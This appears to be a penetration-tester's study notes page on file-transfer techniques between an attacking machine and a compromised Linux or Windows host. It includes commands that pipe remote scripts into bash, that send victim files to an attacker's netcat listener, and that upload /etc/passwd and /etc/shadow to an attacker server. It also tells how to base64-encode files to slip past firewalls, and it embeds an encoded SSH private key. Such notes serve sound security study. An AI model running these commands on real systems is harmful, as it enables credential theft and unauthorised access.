---
title: Transferring files techniques - Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - linux
  - exploitation
  - file transfer technique
  - backdoors
---

# Transferring files techniques  - Linux

## Replicating client-server 

### Setting up a server in the attacking machine 

#### Apache server

Once you have a folder structure such as "/var/www/" or "/var/www/html", and also an Apache server installed, you can serve all files from that path by initiating the service:

```bash
service apache2 start
```


#### Simple python server

```shell-session
# Creating a Web Server with Python3
cd /tmp
python3 -m http.server 8000

# Creating a Web Server with Python2.7
python2.7 -m SimpleHTTPServer
```


#### Creating a Web Server with PHP

```shell-session
php -S 0.0.0.0:8000
```


#### Creating a Web Server with Ruby

```shell-session
ruby -run -ehttpd . -p8000
```


### Download files from victim's machine

#### wget

```shell-session
wget http://<SERVERIP>:<SERVERPORT>/<file>
```

#### curl

```shell-session
curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
```


### Fileless downloads using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

#### Fileless Download with cURL

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```


#### Fileless Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Bash downloads

On the server side (attacking machine), setup a server by using one of the methodologies applied above.

On the client side (victim's machine):

```shell-session
# Connecting to the Target Webserver (attacking machine serving the file)
exec 3<>/dev/tcp/$ip/80

# Requesting the file to the server 
echo -e "GET /file.sh HTTP/1.1\n\n">&3

# Printing the Response
cat <&3
```

## Netcat

### Printing information on screen

On the server side (attacking machine):

```bash
#data will be printed on screen
nc -lvp <port>  
```

On the client side (victim's machine):

```bash
echo “hello” | nc -v $ip <port>
```

###  Transfer data and save it in a file with netcat

On the server side (attacking machine):

```bash
# Data will be stored in reveived.txt file.
nc -lvp <port> > received.txt   
```

On the client side (victim's machine):

```bash
cat tobesentfiel.txt | nc -v $ip <port>
```


## SSH downloads and uploads: SCP

SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 

Two requirements:

 - we have ssh user credentials on the remote host
 - ssh is open on port 22

On the server's side (attacker's machine):

```shell-session
# Enable the service
sudo systemctl enable ssh

# Start the server
sudo systemctl start ssh

# Check if port is listening
netstat -lnpt
```

From the attacker machine too:

```
# Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)
scp username@$IPvictim:foobar.txt /some/local/directory

# Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
scp foo.txt username@$IPvictim:/some/remote/directory
```



## Base64

To avoid firewall protections we can:

**1.** Base64 encode the file:

```shell-session
base64 file.php -w 0

# Alternative
cat file |base64 -w 0;echo

```

**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:

```shell-session
echo -n "Looooooong-string-encoded-in-base64" | base64 -d > file.php
# -n: do not output the trailing newline
```

## Web upload

We can use [uploadserver](uploadserver).


```bash
# Install
python3 -m pip install --user uploadserver

# As we will use https, we will create a self-signed certificate. This file should be hosted in a different location from the web server folder
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Start the web server
python3 -m uploadserver 443 --server-certificate /location/different/folder/server.pem

# Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# We used the option --insecure because we used a self-signed certificate that we trust.
```


 ## Backdoors

See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).


## Windows File Transfer Methods

### PowerShell Base64 Encode & Decode

If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.

```bash
# We have access to the machine `MS02`, and we need to download a file from our `Pwnbox` machine. 

# Pwnbox Check SSH Key MD5 Hash
md5sum id_rsa

# Pwnbox Encode SSH Key to Base64
cat id_rsa |base64 -w 0;echo

# Copy content and paste it into a Windows PowerShell terminal and decode it.
PS C:\lala> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

# Confirming the MD5 Hashes Match with [Get-FileHash cmdlet](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2)
PS C:\lala> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

# While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. 

